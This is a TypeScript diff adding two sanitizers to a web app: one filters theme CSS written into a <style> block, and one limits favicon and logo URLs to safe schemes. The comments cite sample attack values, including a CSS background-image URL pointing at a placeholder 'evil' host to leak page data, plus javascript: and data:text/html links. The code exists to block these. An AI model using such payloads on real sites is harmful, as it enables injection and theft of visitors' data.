@@ -104,3 +104,73 @@ export function safeHtml(html: unknown): string {
     ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
   });
 }
+
+/**
+ * Make operator-supplied CSS safe to place inside a `<style>` block.
+ *
+ * The zone theme carries `custom_css`, and the root layout wrote it into
+ * `<style>{theme.custom_css}</style>`. Svelte escapes for HTML, not for CSS,
+ * and inside a `<style>` element the browser is parsing CSS — so `</style>` in
+ * the value closes the block and everything after it is markup again. That is
+ * a script tag away from executing on every page of the public site, written by
+ * whoever can edit a zone theme.
+ *
+ * Even without the escape, CSS on its own reaches the network: `url(...)` and
+ * `@import` fetch, which turns a stylesheet into a visitor tracker and, with
+ * `background-image: url(https://evil/?t=…)`, a way to read values out of the
+ * page.
+ *
+ * This is a filter, not a parser. It removes the constructs that leave the
+ * stylesheet — the same list `DANGEROUS_STYLE` uses for inline `style`
+ * attributes — and neutralises anything that could terminate the element. A
+ * theme that needs a web font should get an explicit field for it rather than
+ * a hole here.
+ */
+export function safeCss(css: unknown): string {
+  if (typeof css !== 'string' || css.length === 0) return '';
+  // 64 KB is far beyond any legitimate theme override and bounds the work.
+  if (css.length > 64_000) return '';
+  return (
+    css
+      // Anything that could close the <style> element, in any casing, and the
+      // HTML comment delimiters that let a payload hide from the CSS parser.
+      .replace(/<\s*\/?\s*(style|script)\b[^>]*>/gi, '')
+      .replace(/<!--|-->/g, '')
+      // Network fetches: url(), @import, and the legacy IE expression().
+      //
+      // Renamed to an unknown function rather than wrapped in a CSS comment:
+      // a comment ends at the first `*/`, so an input already containing one
+      // would close it early and hand the rest back to the parser as live CSS.
+      // `zvx(` is not a function any engine knows, so the whole declaration is
+      // dropped — and nothing that looks like `url(` survives in the output to
+      // confuse the next reader.
+      .replace(/@import\b[^;]*;?/gi, '')
+      .replace(/\burl\s*\(/gi, 'zvx(')
+      .replace(/\bexpression\s*\(/gi, 'zvx(')
+      // Scheme-bearing values that survive the above.
+      .replace(/javascript\s*:/gi, '')
+      .replace(/\bbehavior\s*:/gi, '')
+  );
+}
+
+/**
+ * Restrict a theme-supplied URL to schemes that only ever fetch an image.
+ *
+ * `favicon_url` and `logo_url` are written straight into `href`/`src`. Svelte
+ * escapes the value, so this is not an injection — but `javascript:` in an
+ * `href` is not injection either, it is simply a URL the browser will execute
+ * when someone clicks. `data:` is the other one: `data:text/html,…` in a link
+ * navigates to attacker-authored markup on a same-origin-looking page.
+ *
+ * Relative paths and https are what a real theme uses. Everything else returns
+ * empty, so the element renders without an image instead of with a payload.
+ */
+export function safeImageUrl(url: unknown): string {
+  if (typeof url !== 'string') return '';
+  const t = url.trim();
+  if (t.length === 0 || t.length > 2000) return '';
+  // Relative paths, including protocol-relative //host which is https in
+  // practice and cannot carry a scheme.
+  if (t.startsWith('/')) return t;
+  return /^https?:\/\//i.test(t) ? t : '';
+}
